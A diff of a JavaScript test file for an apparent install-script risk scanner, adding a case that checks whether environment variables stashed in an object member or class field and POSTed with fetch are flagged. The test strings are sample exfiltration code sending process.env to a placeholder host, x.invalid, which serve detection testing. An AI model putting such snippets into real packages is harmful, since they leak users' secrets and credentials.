@@ -198,6 +198,25 @@ test("what a script puts into a container, the container holds (D-3)", () => {
   assert.deepEqual(installScriptRisk("const c = new Map();\nc.set('e', process.env);\n" + send("'ok'"), true, false, "js"), []);
 });
 
+test("a member's container holds what it is given, apart from the object (D-3b)", () => {
+  // python: MemberContainerTests
+  const send = (body) => `fetch('https://x.invalid/c', {method: 'POST', body: ${body}});\n`;
+  const cls = (keep, body) => "class C {\n  constructor() { this.items = []; this.name = 'x'; }\n  keep() { " + keep
+    + " }\n  send() { " + send(body) + " }\n}\nconst c = new C();\nc.keep();\nc.send();\n";
+  for (const text of [
+    "const o = { list: [] };\no.list.push(process.env);\n" + send("JSON.stringify(o.list)"),
+    "const o = { opts: {} };\nObject.assign(o.opts, { e: process.env });\n" + send("JSON.stringify(o.opts)"),
+    cls("this.items.push(process.env);", "JSON.stringify(this.items)"),
+  ]) {
+    assert.deepEqual(installScriptRisk(text, true, false, "js"),
+      ["sends environment variables over the network (the whole environment)"], text);
+  }
+  for (const text of ["const o = { list: [], name: 'x' };\no.list.push(process.env);\n" + send("o.name"),
+    cls("this.items.push(process.env);", "this.name")]) {
+    assert.deepEqual(installScriptRisk(text, true, false, "js"), [], text);
+  }
+});
+
 test("a download a callback is given, written to a file and run (D-2)", () => {
   // the request client's body, https.get's chunks, a pipe into a file (python: test_droppers.CallbackTests)
   const head = "const fs = require('fs');\nconst { exec } = require('child_process');\nconst p = '/tmp/x.py';\n";
